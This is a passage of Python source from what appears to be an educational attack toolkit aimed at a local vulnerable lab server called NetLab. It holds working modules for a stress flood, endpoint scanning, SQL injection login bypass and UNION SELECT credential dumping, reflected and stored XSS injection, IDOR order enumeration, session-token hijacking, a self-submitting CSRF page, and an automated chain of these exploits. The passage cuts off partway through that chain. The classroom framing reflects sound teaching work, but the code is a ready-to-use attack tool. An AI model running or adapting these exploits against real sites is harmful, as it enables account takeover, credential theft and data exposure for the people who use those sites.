        w.close()
        self._tentativas += 1

    async def _stats_loop(self, tempo_fim: float) -> None:
        loop = asyncio.get_event_loop()
        ini  = loop.time()
        while loop.time() < tempo_fim:
            passado  = max(loop.time() - ini, 1e-9)
            restante = max(tempo_fim - loop.time(), 0)
            tps      = self._tentativas / passado
            sys.stdout.write(
                f"\r  [+] Enviados: {self._tentativas:>7,}  "
                f"Recusados: {self._recusados:>5,}  "
                f"Erros: {self._erros:>5,}  "
                f"{tps:>7.1f} req/s  "
                f"Restante: {restante:>4.0f}s   "
            )
            sys.stdout.flush()
            await asyncio.sleep(1)

    def mostrar_resultado(self) -> None:
        tps = self._tentativas / max(self._duracao, 1)
        tabela_rich([
            ["Tipo",           self._tipo.upper()],
            ["Enviados",       f"{self._tentativas:,}"],
            ["Recusados",      f"{self._recusados:,}"],
            ["Erros",          f"{self._erros:,}"],
            ["Duração",        f"{self._duracao:.0f}s"],
            ["Taxa média",     f"{tps:.1f} req/s"],
        ], ["Métrica", "Valor"], "Resultado — Teste de Estresse")
        info("Verifique a aba Servidor no NetLab: barra de carga e req/s em tempo real.")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 3 — Scanner de Endpoints
# ══════════════════════════════════════════════════════════════════════════════

class ModuloScanner(BaseAtaque):
    """Enumera endpoints e analisa headers de segurança."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base:     str   = "http://localhost:8080"
        self._concorrencia: int   = 15
        self._timeout:      float = 3.0
        self._resultados:   List[dict] = []

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: Scanner de Endpoints ──{_RESET}")
        self._url_base    = entrada("URL base", "http://localhost:8080").rstrip("/")
        self._concorrencia = min(int(entrada("Concorrência", "15")), 30)
        self._timeout     = max(0.1, float(entrada("Timeout (s)", "2.5")))
        ok(f"Scaneando {len(_ENDPOINTS)} endpoints em {self._url_base}")

    def executar(self) -> None:
        if _AIOHTTP_OK:
            asyncio.run(self._async_main())
        elif _REQUESTS_OK:
            self._sync_main()
        else:
            erro("Nenhuma lib HTTP disponível.")

    async def _async_main(self) -> None:
        sem = asyncio.Semaphore(self._concorrencia)
        connector  = aiohttp.TCPConnector(ssl=False)
        timeout_ob = aiohttp.ClientTimeout(total=self._timeout)
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout_ob
        ) as sess:
            tarefas = [
                asyncio.create_task(self._scan_ep(sess, sem, ep))
                for ep in _ENDPOINTS
            ]
            await asyncio.gather(*tarefas, return_exceptions=True)

    async def _scan_ep(self, sess, sem, ep: str) -> None:
        url = self._url_base + ep
        async with sem:
            try:
                async with sess.get(
                    url, allow_redirects=False,
                    headers={"User-Agent": _ua()},
                ) as resp:
                    hdrs = dict(resp.headers)
                    self._registrar(ep, resp.status, hdrs)
                    self._tentativas += 1
            except Exception as e:
                self._registrar(ep, 0, {}, str(e))
                self._erros += 1

    def _sync_main(self) -> None:
        sess = _req.Session()
        for ep in _ENDPOINTS:
            url = self._url_base + ep
            try:
                r = sess.get(url, timeout=self._timeout, allow_redirects=False,
                             headers={"User-Agent": _ua()})
                self._registrar(ep, r.status_code, dict(r.headers))
                self._tentativas += 1
            except Exception as e:
                self._registrar(ep, 0, {}, str(e))
                self._erros += 1

    def _registrar(self, ep: str, status: int,
                   hdrs: dict, msg_erro: str = "") -> None:
        _HDRS_SEG = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options",
        ]
        ausentes = [h for h in _HDRS_SEG if h not in hdrs]
        self._resultados.append({
            "endpoint": ep, "status": status, "ausentes": ausentes,
            "server":   hdrs.get("Server", ""), "erro": msg_erro,
        })

        if status == 0:
            cor, s = _VERM,     "✗"
        elif status in (200, 201):
            cor, s = _VERDE,    "✓"
        elif status in (301, 302, 307):
            cor, s = _AMAR,     "→"
        elif status == 404:
            cor, s = "\033[90m", "·"
        elif status == 429:
            cor, s = _MAG,       "⊘"
        else:
            cor, s = _CIANO,     "?"

        servidor = f"  Server: {hdrs['Server'][:28]}" if hdrs.get("Server") else ""
        print(f"  {cor}{s}{_RESET} {str(status) if status else 'ERR':>3}  {ep:<28}{servidor}")

    def mostrar_resultado(self) -> None:
        ativos = [r for r in self._resultados if r["status"] in (200, 201, 302, 301)]
        alertas = [r for r in ativos if r["ausentes"]]

        if alertas:
            print(f"\n  {_AMAR}Headers de segurança ausentes:{_RESET}")
            for r in alertas:
                print(f"    {r['endpoint']}")
                for h in r["ausentes"]:
                    print(f"      {_VERM}✗{_RESET} {h}")

        tabela_rich([
            ["Endpoints testados", str(len(_ENDPOINTS))],
            ["Ativos (2xx/3xx)",   str(len(ativos))],
            ["Erros de rede",      str(self._erros)],
            ["Tempo",              f"{self._decorrido:.2f}s"],
        ], ["Métrica", "Valor"], "Resultado — Scanner")

        if ativos:
            info("Endpoints ativos:")
            for r in ativos:
                print(f"    {r['endpoint']}  [{r['status']}]")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 4 — Interceptação HTTP
# ══════════════════════════════════════════════════════════════════════════════

class ModuloIntercepcaoHTTP(BaseAtaque):
    """Submete formulários e exibe o payload em texto puro (como um sniffer veria)."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base:   str = "http://localhost:8080"
        self._repeticoes: int = 3

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: Interceptação HTTP ──{_RESET}")
        self._url_base   = entrada("URL base", "http://localhost:8080").rstrip("/")
        self._repeticoes = int(entrada("Quantas submissões de demonstração", "3"))

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("requests ausente. Execute: pip install requests")
            return

        # Pares (endpoint, dados) — todos os formulários que o NetLab expõe
        demos = [
            ("/login",      {"usuario": "alice",   "senha": "alice123"}),
            ("/login",      {"usuario": "admin",   "senha": "123456"}),
            ("/register",   {"usuario": "teste",   "senha": "1234",
                             "confirmar": "1234"}),
            ("/comentarios", {"conteudo": "Olá mundo — interceptação demo"}),
        ]

        print(f"\n  {_AMAR}Enviando dados sensíveis via HTTP sem criptografia...{_RESET}")
        print(f"  {'─'*62}")

        sess = _req.Session()
        # Faz login primeiro para obter sessão (necessário para /comentarios)
        try:
            sess.post(self._url_base + "/login",
                      data={"usuario": "alice", "senha": "alice123"},
                      timeout=4, allow_redirects=False)
        except Exception:
            pass

        for i in range(self._repeticoes):
            ep, dados = demos[i % len(demos)]
            url = self._url_base + ep
            corpo_raw = "&".join(f"{k}={v}" for k, v in dados.items())

            print(f"\n  {_BOLD}Requisição #{i+1}:{_RESET}")
            print(f"    {_VERM}POST {url} HTTP/1.1{_RESET}")
            print(f"    Content-Type: application/x-www-form-urlencoded")
            print(f"    {_VERM}Payload (visível na rede):{_RESET}")
            print(f"    {_AMAR}  {corpo_raw}{_RESET}")

            try:
                r = sess.post(url, data=dados, timeout=4.0, allow_redirects=False,
                              headers=_headers_extras())
                print(f"    {_VERDE}→ HTTP {r.status_code}{_RESET}")
            except Exception as e:
                print(f"    {_VERM}→ ERRO: {e}{_RESET}")

            self._tentativas += 1
            time.sleep(0.4)

        print(f"\n  {'─'*62}")
        print(f"  {_VERM}Qualquer sniffer na mesma rede captura esses dados integralmente.{_RESET}")
        print(f"  {_VERDE}Ative o Modo Análise no NetLab para ver os pacotes em tempo real.{_RESET}")

    def mostrar_resultado(self) -> None:
        tabela_rich([
            ["Formulários enviados", str(self._tentativas)],
            ["Protocolo",            "HTTP — sem criptografia"],
            ["Visibilidade",         "TOTAL — credenciais em texto puro"],
            ["Mitigação",            "HTTPS + HSTS obrigatório"],
        ], ["Item", "Detalhe"], "Resultado — Interceptação HTTP")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 5 — SQL Injection
# ══════════════════════════════════════════════════════════════════════════════

class ModuloSQLInjection(BaseAtaque):
    """
    Explora SQLi em dois vetores:
      • /login  — bypass de autenticação por concatenação direta
      • /produtos?id=  — UNION SELECT para dump da tabela users
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:       str        = ""
        self._bypass_login:   bool       = True
        self._dump_users:     bool       = True
        self._resultados:     List[dict] = []

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: SQL Injection ──{_RESET}")
        self._url_base    = entrada("URL base", "http://localhost:8080").rstrip("/")
        testar_conectividade(self._url_base)
        self._bypass_login = entrada("Testar bypass de login? (S/n)", "s").lower().startswith("s")
        self._dump_users   = entrada("Extrair tabela users via UNION? (S/n)", "s").lower().startswith("s")

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("requests ausente. Execute: pip install requests")
            return
        if self._bypass_login:
            self._fase_bypass()
        if self._dump_users:
            self._fase_dump()

    # ── Fase 1: Bypass de login ───────────────────────────────────────────────

    def _fase_bypass(self) -> None:
        print(f"\n  {_AMAR}[*] Fase 1: Bypass de login via SQL Injection{_RESET}")
        sess = _req.Session()

        for payload in _SQLI_BYPASS:
            try:
                r = sess.post(
                    self._url_base + "/login",
                    data={"usuario": "admin", "senha": payload},
                    timeout=5,
                    allow_redirects=False,
                    headers=_headers_extras(),
                )
                if _login_bem_sucedido(r.status_code, r.text,
                                        r.headers.get("Location", "")):
                    ok(f"Bypass bem-sucedido!  payload: {payload!r}")
                    self._resultados.append({"tipo": "bypass", "payload": payload,
                                              "status": r.status_code})
                    # Exibe cookie de sessão obtido
                    cookie = r.headers.get("Set-Cookie", "")
                    if cookie:
                        info(f"Cookie de sessão: {cookie[:80]}")
                    self._tentativas += 1
                    return
                else:
                    info(f"Payload falhou (HTTP {r.status_code}): {payload!r}")
            except Exception as e:
                erro(f"Erro no payload {payload!r}: {e}")
            self._tentativas += 1
            time.sleep(0.2)

        erro("Nenhum payload de bypass funcionou.")

    # ── Fase 2: UNION SELECT dump ─────────────────────────────────────────────

    def _fase_dump(self) -> None:
        print(f"\n  {_AMAR}[*] Fase 2: Extração de dados via UNION SELECT{_RESET}")

        # Descobre número de colunas com ORDER BY
        n_cols = self._descobrir_colunas()
        info(f"Colunas detectadas: {n_cols}")

        if n_cols < 2:
            aviso("Não foi possível detectar colunas. Tentando com 3 colunas (padrão).")
            n_cols = 3

        # Dump de todos os usuários
        # O servidor retorna resultado em <td>...</td>
        payloads_dump = [
            # group_concat para obter todos de uma vez
            f" UNION SELECT 1,(SELECT group_concat(username||':'||password||':'||role,'|') FROM users),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 0),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 1),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 2),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 3),1--",
        ]

        dados_extraidos: List[str] = []
        for payload in payloads_dump:
            resultado = self._injetar(payload)
            if resultado:
                ok(f"Dados extraídos: {resultado}")
                dados_extraidos.append(resultado)
                self._resultados.append({"tipo": "dump", "dados": resultado})
                # Se group_concat funcionou, temos tudo na primeira query
                if "|" in resultado or ":" in resultado:
                    break
            self._tentativas += 1
            time.sleep(0.2)

        if not dados_extraidos:
            # Tenta listar tabelas primeiro
            tabelas = self._injetar(
                " UNION SELECT 1,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),1--"
            )
            if tabelas:
                info(f"Tabelas no banco: {tabelas}")
            erro("Não foi possível extrair dados de usuários.")

    def _descobrir_colunas(self) -> int:
        """Usa ORDER BY para detectar quantas colunas existem na query original."""
        for i in range(1, 10):
            try:
                r = _req.get(
                    self._url_base + f"/produtos?id=1 ORDER BY {i}--",
                    timeout=4, headers=_headers_extras(),
                )
                # Se retornar erro de SQL, a coluna i não existe
                if r.status_code != 200 or ("erro" in r.text.lower()
                                              and "column" in r.text.lower()):
                    return i - 1
            except Exception:
                return i - 1
        return 3  # fallback padrão

    def _injetar(self, payload_sql: str) -> Optional[str]:
        """Executa injeção em /produtos?id= e extrai o valor da segunda <td>."""
        try:
            url = self._url_base + "/produtos?id=1" + payload_sql
            r   = _req.get(url, timeout=5, headers=_headers_extras())
            if r.status_code == 200:
                # Extrai todos os <td>...</td>
                tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text, re.DOTALL | re.IGNORECASE)
                # Remove tags HTML do conteúdo
                tds_limpos = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                # Descarta células triviais (1, 2, 3...)
                for td in tds_limpos:
                    if td and td not in ("1", "2", "3", "—", ""):
                        return td
        except Exception as e:
            aviso(f"Erro na injeção: {e}")
        return None

    def mostrar_resultado(self) -> None:
        if self._resultados:
            tabela_rich([
                [r["tipo"].upper(),
                 r.get("payload", r.get("dados", ""))[:80]]
                for r in self._resultados
            ], ["Tipo", "Resultado"], "Resultado — SQL Injection")
        else:
            erro("Nenhuma exploração bem-sucedida.")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 6 — XSS Exploit
# ══════════════════════════════════════════════════════════════════════════════

class ModuloXSS(BaseAtaque):
    """Testa XSS refletido (/busca, /perfil) e armazenado (/comentarios)."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base:      str  = ""
        self._refletido:     bool = True
        self._armazenado:    bool = True
        self._usuario:       str  = "alice"
        self._senha:         str  = "alice123"
        self._achados:       List[dict] = []

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: XSS Exploit ──{_RESET}")
        self._url_base  = entrada("URL base", "http://localhost:8080").rstrip("/")
        testar_conectividade(self._url_base)
        self._refletido  = entrada("Testar XSS refletido? (S/n)", "s").lower().startswith("s")
        self._armazenado = entrada("Testar XSS armazenado? (S/n)", "s").lower().startswith("s")
        if self._armazenado:
            self._usuario = entrada("Usuário para login (XSS armazenado)", "alice")
            self._senha   = entrada("Senha", "alice123")

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("requests ausente.")
            return

        sess = _req.Session()

        if self._refletido:
            self._xss_refletido(sess)

        if self._armazenado:
            self._xss_armazenado(sess)

    def _xss_refletido(self, sess: "_req.Session") -> None:
        print(f"\n  {_AMAR}[*] Testando XSS refletido...{_RESET}")

        # (endpoint, parâmetro_GET)
        vetores = [
            ("/busca?q=",      "q"),
            ("/perfil?nome=",  "nome"),
        ]

        for ep_base, _ in vetores:
            for payload in _XSS_PAYLOADS:
                url = self._url_base + ep_base + payload
                try:
                    r = sess.get(url, timeout=4, headers=_headers_extras())
                    # Verifica se o payload aparece não escapado no HTML
                    # (busca a tag/evento no HTML raw, sem <br> ou encoding)
                    payload_tag = re.sub(r"alert\(['\"]XSS['\"]\)", "alert", payload)
                    if payload_tag.lower() in r.text.lower():
                        ok(f"XSS refletido CONFIRMADO em {ep_base}")
                        info(f"  Payload: {payload}")
                        self._achados.append({"tipo": "refletido", "endpoint": ep_base,
                                              "payload": payload})
                    else:
                        print(f"  {_DIM}· Payload escapado em {ep_base}: {payload[:40]}{_RESET}")
                    self._tentativas += 1
                    time.sleep(0.2)
                except Exception as e:
                    erro(f"Erro em {url}: {e}")

    def _xss_armazenado(self, sess: "_req.Session") -> None:
        print(f"\n  {_AMAR}[*] Testando XSS armazenado em /comentarios...{_RESET}")

        # Login
        try:
            r_login = sess.post(
                self._url_base + "/login",
                data={"usuario": self._usuario, "senha": self._senha},
                timeout=5, allow_redirects=False, headers=_headers_extras(),
            )
        except Exception as e:
            erro(f"Erro no login: {e}")
            return

        if not _login_bem_sucedido(r_login.status_code, r_login.text,
                                    r_login.headers.get("Location", "")):
            erro(f"Login falhou (HTTP {r_login.status_code}) — XSS armazenado cancelado.")
            info("  Dica: verifique usuário/senha. Padrão: alice / alice123")
            return

        ok(f"Login realizado como {self._usuario}.")

        for payload in _XSS_PAYLOADS[:3]:
            try:
                r = sess.post(
                    self._url_base + "/comentarios",
                    data={"conteudo": payload},
                    timeout=4, allow_redirects=False, headers=_headers_extras(),
                )
                if r.status_code in (200, 302):
                    ok(f"Comentário malicioso enviado: {payload}")
                    # Verifica se persiste na página
                    r_check = sess.get(self._url_base + "/comentarios",
                                       timeout=4, headers=_headers_extras())
                    tag = re.sub(r"alert\(['\"]XSS['\"]\)", "alert", payload)
                    if tag.lower() in r_check.text.lower():
                        ok(f"XSS ARMAZENADO CONFIRMADO na página /comentarios!")
                        self._achados.append({"tipo": "armazenado",
                                              "endpoint": "/comentarios",
                                              "payload": payload})
                    else:
                        info("  Payload enviado — verifique /comentarios no navegador.")
                    self._tentativas += 1
                    time.sleep(0.3)
            except Exception as e:
                erro(f"Erro ao enviar comentário: {e}")

    def mostrar_resultado(self) -> None:
        if self._achados:
            tabela_rich([
                [a["tipo"].capitalize(), a["endpoint"], a["payload"][:50]]
                for a in self._achados
            ], ["Tipo", "Endpoint", "Payload"], "Resultado — XSS")
        else:
            info("Nenhum XSS confirmado automaticamente. "
                 "Verifique as URLs manualmente no navegador.")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 7 — IDOR Exploit
# ══════════════════════════════════════════════════════════════════════════════

class ModuloIDOR(BaseAtaque):
    """
    Acessa pedidos de outros usuários sem autenticação via /pedidos?id=N.
    O servidor não valida se o pedido pertence ao usuário logado.
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:    str  = ""
        self._max_id:      int  = 20
        self._concorrencia: int = 10
        self._achados:     List[Tuple[int, str, str]] = []   # (id, dono, produto)

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: IDOR Exploit ──{_RESET}")
        self._url_base     = entrada("URL base", "http://localhost:8080").rstrip("/")
        testar_conectividade(self._url_base)
        self._max_id       = int(entrada("ID máximo para testar", "20"))
        self._concorrencia = int(entrada("Concorrência", "10"))

    def executar(self) -> None:
        if _AIOHTTP_OK:
            asyncio.run(self._async_main())
        elif _REQUESTS_OK:
            self._sync_main()
        else:
            erro("Nenhuma lib HTTP disponível.")

    async def _async_main(self) -> None:
        sem = asyncio.Semaphore(self._concorrencia)
        conn = aiohttp.TCPConnector(ssl=False)
        tobj = aiohttp.ClientTimeout(total=5.0)
        async with aiohttp.ClientSession(connector=conn, timeout=tobj) as sess:
            tarefas = [
                asyncio.create_task(self._checar_pedido(sess, sem, i))
                for i in range(1, self._max_id + 1)
            ]
            await asyncio.gather(*tarefas, return_exceptions=True)

    async def _checar_pedido(self, sess, sem: asyncio.Semaphore, pid: int) -> None:
        async with sem:
            url = f"{self._url_base}/pedidos?id={pid}"
            try:
                async with sess.get(url, headers={"User-Agent": _ua()}) as resp:
                    if resp.status == 200:
                        texto = await resp.text(errors="ignore")
                        self._processar_resposta(pid, texto)
                    else:
                        print(f"  {_DIM}· Pedido #{pid}: HTTP {resp.status}{_RESET}")
                    self._tentativas += 1
            except Exception:
                self._erros += 1

    def _sync_main(self) -> None:
        sess = _req.Session()
        for pid in range(1, self._max_id + 1):
            url = f"{self._url_base}/pedidos?id={pid}"
            try:
                r = sess.get(url, timeout=5, headers={"User-Agent": _ua()})
                if r.status_code == 200:
                    self._processar_resposta(pid, r.text)
                else:
                    print(f"  {_DIM}· Pedido #{pid}: HTTP {r.status_code}{_RESET}")
                self._tentativas += 1
            except Exception:
                self._erros += 1
            time.sleep(0.1)

    def _processar_resposta(self, pid: int, texto: str) -> None:
        """
        Extrai dono e produto do HTML do pedido.
        O servidor renderiza uma tabela com <td> por campo.
        Estrutura: Usuário | Produto | Preço unitário | Quantidade | Total
        """
        if "Pedido #" not in texto and "Usu" not in texto:
            print(f"  {_DIM}· Pedido #{pid}: não encontrado.{_RESET}")
            return

        # Extrai todos os <td>conteúdo</td>
        tds = re.findall(r"<td[^>]*>(.*?)</td>", texto, re.DOTALL | re.IGNORECASE)
        tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
        tds = [td for td in tds if td]

        # O servidor gera linhas: label | valor (alternadas em tabela de 2 cols)
        dados: dict = {}
        i = 0
        while i + 1 < len(tds):
            chave = tds[i].lower()
            valor = tds[i + 1]
            if "usu" in chave:
                dados["usuario"] = valor
            elif "produto" in chave:
                dados["produto"] = valor
            elif "total" in chave:
                dados["total"] = valor
            i += 2

        # Fallback: tenta encontrar qualquer valor que pareça usuário
        if "usuario" not in dados:
            for td in tds:
                if re.match(r"^[a-z]{2,20}$", td, re.IGNORECASE) and td.lower() not in (
                    "ação", "id", "quantidade", "preço", "total", "pedido"
                ):
                    dados["usuario"] = td
                    break

        usuario = dados.get("usuario", "desconhecido")
        produto = dados.get("produto", "—")

        ok(f"Pedido #{pid} → dono: {_BOLD}{usuario}{_RESET}  produto: {produto}")
        self._achados.append((pid, usuario, produto))

    def mostrar_resultado(self) -> None:
        if self._achados:
            tabela_rich([
                [str(pid), usuario, produto]
                for pid, usuario, produto in sorted(self._achados)
            ], ["ID Pedido", "Dono", "Produto"], "Resultado — IDOR")
        else:
            erro("Nenhum pedido acessível encontrado.")
        tabela_rich([
            ["IDs testados",   str(self._tentativas)],
            ["Pedidos expostos", str(len(self._achados))],
            ["Erros",          str(self._erros)],
        ], ["Métrica", "Valor"], "Resumo — IDOR")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 8 — Session Hijack
# ══════════════════════════════════════════════════════════════════════════════

class ModuloSessionHijack(BaseAtaque):
    """
    Explora tokens de sessão sequenciais e previsíveis (token1, token2...).
    O servidor gera tokens como f"token{contador}" — trivialmente enumeráveis.
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:        str  = ""
        self._max_token:       int  = 50
        self._sessoes_roubadas: List[Tuple[str, str]] = []   # (token, usuário)

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: Session Hijack ──{_RESET}")
        self._url_base    = entrada("URL base", "http://localhost:8080").rstrip("/")
        testar_conectividade(self._url_base)
        self._max_token   = int(entrada("Tokens a enumerar (token1 … tokenN)", "50"))

        info("Dica: faça alguns logins no servidor antes de executar este módulo "
             "para que haja tokens válidos para roubar.")

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("requests ausente.")
            return

        print(f"\n  {_AMAR}[*] Enumerando tokens token1 … token{self._max_token}...{_RESET}")
        sess = _req.Session()

        for i in range(1, self._max_token + 1):
            token = f"token{i}"
            try:
                r = sess.get(
                    self._url_base + "/",
                    cookies={"sessao": token},
                    timeout=4,
                    allow_redirects=False,
                    headers={"User-Agent": _ua()},
                )
                self._tentativas += 1

                # O servidor renderiza "Sessão ativa: <strong>USUARIO</strong>"
                # quando o cookie é válido
                if r.status_code == 200 and (
                    "sessão ativa" in r.text.lower()
                    or "encerrar sessão" in r.text.lower()
                    or "sair" in r.text.lower()
                ):
                    # Extrai o nome do usuário da sessão ativa
                    m = re.search(
                        r"Sess[aã]o ativa.*?<strong>(.*?)</strong>",
                        r.text, re.IGNORECASE | re.DOTALL,
                    )
                    if not m:
                        # Fallback: qualquer <strong> na página
                        m = re.search(r"<strong>([^<]{2,40})</strong>", r.text)

                    usuario = m.group(1).strip() if m else "desconhecido"
                    ok(f"Token válido: {_BOLD}{token}{_RESET} → usuário: {_BOLD}{usuario}{_RESET}")
                    self._sessoes_roubadas.append((token, usuario))
                else:
                    print(f"  {_DIM}· {token}: inválido (HTTP {r.status_code}){_RESET}")

            except Exception as e:
                erro(f"Erro em {token}: {e}")
                self._erros += 1

            time.sleep(0.08)

    def mostrar_resultado(self) -> None:
        if self._sessoes_roubadas:
            tabela_rich(
                [[tok, usr] for tok, usr in self._sessoes_roubadas],
                ["Token", "Usuário"], "Sessões Sequestradas",
            )
            print(f"\n  {_VERDE}Use qualquer desses cookies num navegador para assumir a sessão.{_RESET}")
        else:
            erro("Nenhum token válido encontrado.")
            info("Dica: faça logins no servidor (módulo 1 ou manualmente) "
                 "e execute este módulo em seguida.")
        tabela_rich([
            ["Tokens testados", str(self._tentativas)],
            ["Sessões roubadas", str(len(self._sessoes_roubadas))],
            ["Erros",           str(self._erros)],
        ], ["Métrica", "Valor"], "Resumo — Session Hijack")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 9 — CSRF PoC
# ══════════════════════════════════════════════════════════════════════════════

class ModuloCSRF(BaseAtaque):
    """Gera página HTML que posta comentário em nome de um usuário autenticado."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base: str = ""
        self._conteudo: str = "CSRF_vulnerability_demo — postado sem consentimento"
        self._arquivo:  str = "csrf_poc.html"

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: CSRF PoC ──{_RESET}")
        self._url_base = entrada("URL base", "http://localhost:8080").rstrip("/")
        self._conteudo = entrada(
            "Conteúdo do comentário malicioso",
            "CSRF_vulnerability_demo — postado sem consentimento",
        )
        self._arquivo  = entrada("Nome do arquivo HTML de saída", "csrf_poc.html")

    def executar(self) -> None:
        url_alvo = self._url_base + "/comentarios"
        html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC — NetLab Educacional</title>
  <style>
    body {{ font-family: sans-serif; background: #111; color: #eee;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; height: 100vh; margin: 0; }}
    h2   {{ color: #ff4444; }}
    p    {{ max-width: 500px; text-align: center; color: #aaa; }}
    code {{ background: #222; padding: 4px 8px; border-radius: 4px; color: #7cf; }}
  </style>
</head>
<body>
  <h2>⚠ CSRF Proof of Concept</h2>
  <p>
    Se você estiver logado em <code>{self._url_base}</code>,
    este formulário oculto será submetido automaticamente,
    postando um comentário em seu nome — sem qualquer confirmação.
  </p>
  <p>Aguarde... redirecionando.</p>

  <!-- Formulário oculto auto-submetido — sem token CSRF de proteção -->
  <form id="csrf_form"
        action="{url_alvo}"
        method="POST"
        style="display:none;">
    <input type="hidden" name="conteudo" value="{self._conteudo}">
  </form>

  <script>
    // Auto-submissão imediata
    document.getElementById('csrf_form').submit();
  </script>
</body>
</html>"""

        try:
            with open(self._arquivo, "w", encoding="utf-8") as f:
                f.write(html)
            ok(f"PoC salvo em '{self._arquivo}'.")
            info("Como demonstrar em aula:")
            info("  1. Faça login no servidor NetLab em um navegador.")
            info(f"  2. Abra '{self._arquivo}' no MESMO navegador.")
            info("  3. Observe o comentário postado automaticamente em /comentarios.")
            info("  4. A vítima não interagiu com o formulário — é CSRF puro.")
        except Exception as e:
            erro(f"Erro ao salvar arquivo: {e}")

    def mostrar_resultado(self) -> None:
        info("CSRF PoC gerado. Nenhuma requisição foi feita automaticamente —"
             " a demonstração requer abrir o HTML num navegador autenticado.")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 10 — Auto-Pwn (Encadeamento de Exploits)
# ══════════════════════════════════════════════════════════════════════════════

class ModuloAutoPwn(BaseAtaque):
    """
    Encadeia automaticamente:
      Fase 1 — SQLi bypass de login  →  obtém sessão admin
      Fase 2 — UNION SELECT          →  extrai todos os usuários e senhas
      Fase 3 — IDOR                  →  acessa todos os pedidos
      Fase 4 — XSS armazenado        →  injeta payload em /comentarios
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:    str  = ""
        self._credenciais: Optional[Tuple[str, str]] = None
        self._cookie:      str  = ""
        self._log:         List[str] = []

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: Auto-Pwn ──{_RESET}")
        self._url_base = entrada("URL base", "http://localhost:8080").rstrip("/")
        testar_conectividade(self._url_base)
        info("O Auto-Pwn executará todas as fases automaticamente.")

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("requests ausente. Execute: pip install requests")
            return

        self._fase1_sqli_bypass()
        if not self._credenciais:
            aviso("Bypass falhou. Tentando extrair credenciais via UNION SELECT...")
            self._fase1b_union_creds()

        if self._credenciais:
            self._fase2_login_legitimo()
            self._fase3_idor()
            self._fase4_xss()
        else:
            erro("Não foi possível obter credenciais. Verifique se o servidor está rodando.")

    def _fase1_sqli_bypass(self) -> None:
        print(f"\n  {_AMAR}[*] Fase 1a: SQL Injection — bypass de login{_RESET}")
        sess = _req.Session()
        for payload in _SQLI_BYPASS:
            try:
                r = sess.post(
                    self._url_base + "/login",
                    data={"usuario": "admin", "senha": payload},
                    timeout=5, allow_redirects=False, headers=_headers_extras(),
                )
                if _login_bem_sucedido(r.status_code, r.text,
                                        r.headers.get("Location", "")):
                    ok(f"SQLi bypass: {payload!r}")
                    self._cookie = r.headers.get("Set-Cookie", "")
                    # Tenta extrair nome do usuário logado
                    m = re.search(r"iniciada como.*?<strong>(.*?)</strong>",
                                  r.text, re.IGNORECASE | re.DOTALL)
                    usuario = m.group(1).strip() if m else "admin"
                    self._credenciais = (usuario, payload)
                    self._log.append(f"SQLi bypass OK: {usuario} / {payload!r}")
                    return
            except Exception as e:
                aviso(f"Erro no bypass: {e}")
            time.sleep(0.2)

    def _fase1b_union_creds(self) -> None:
        print(f"\n  {_AMAR}[*] Fase 1b: UNION SELECT — extração de credenciais{_RESET}")
        payloads = [
            " UNION SELECT 1,(SELECT username||':'||password FROM users WHERE role='admin' LIMIT 1),1--",
            " UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1),1--",
            " UNION SELECT 1,(SELECT group_concat(username||':'||password,'|') FROM users),1--",
        ]
        for payload in payloads:
            resultado = self._injetar_union(payload)
            if resultado and ":" in resultado:
                partes    = resultado.split("|")[0].split(":", 1)
                if len(partes) == 2:
                    usuario, senha = partes[0].strip(), partes[1].strip()
                    ok(f"Credenciais extraídas: {usuario}:{senha}")
                    self._credenciais = (usuario, senha)
                    self._log.append(f"UNION dump: {usuario}:{senha}")
                    return
            time.sleep(0.2)

    def _injetar_union(self, payload: str) -> Optional[str]:
        try:
            r = _req.get(
                self._url_base + "/produtos?id=1" + payload,
                timeout=5, headers=_headers_extras(),
            )
            if r.status_code == 200:
                tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text, re.DOTALL | re.IGNORECASE)
